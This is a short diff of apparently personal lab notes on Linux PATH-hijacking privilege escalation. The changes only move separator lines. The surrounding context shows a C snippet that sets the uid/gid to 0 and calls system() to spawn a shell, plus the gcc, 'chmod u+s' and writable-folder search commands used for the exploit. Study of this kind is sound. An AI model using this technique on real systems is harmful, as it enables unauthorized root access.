@@ -119,6 +119,7 @@ Function Shortcut
   4. Is there a script/application you can start that will be affected by this vulnerability?
 ---------------------------
   path_exp.c:
+---------------------------
   #include <unistd.h>
   void main()
   {
@@ -126,7 +127,7 @@ Function Shortcut
   setgid(0);
   system(thm); `any binary that will run /bin/bash`
   }
----------------------------
+
   - gcc path_exp.c -o path -w `compile the C script`
   - chmod u+s path
   - find / -writable 2>/dev/null: `search for writable folders`
